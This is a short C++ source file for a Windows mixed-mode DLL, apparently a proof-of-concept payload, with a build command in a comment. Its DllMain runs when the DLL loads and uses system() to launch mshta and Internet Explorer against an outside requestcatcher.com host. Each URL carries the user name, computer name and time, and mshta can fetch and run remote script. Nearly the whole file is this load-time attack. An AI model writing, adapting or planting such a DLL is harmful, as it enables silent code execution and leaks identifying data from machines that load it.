#define UNICODE
#include "windows.h"

// "C:\Program Files (x86)\Microsoft Visual Studio\2019\BuildTools\VC\Tools\MSVC\14.29.30133\bin\Hostx64\x64\cl.exe" /clr /LD MixedAssembly.cpp -o MixedAssembly64.dll

#pragma unmanaged
extern "C" BOOL APIENTRY DllMain(HMODULE hinstDLL, DWORD fwdReason, void* lpvReserved)
{
	if (fwdReason == DLL_PROCESS_ATTACH)
	{

		system("cmd.exe /c \"mshta \"https://v.requestcatcher.com/mshta?t=%username%\\%computername%\\%time%\"\"");
		system("cmd.exe /c \"\"%ProgramFiles%\\Internet Explorer\\iexplore.exe\" \"https://v.requestcatcher.com/ie?t=%username%\\%computername%\\%time%\"\"");
//		system("notepad %windir%\\win.ini");

	}
	return TRUE;
}
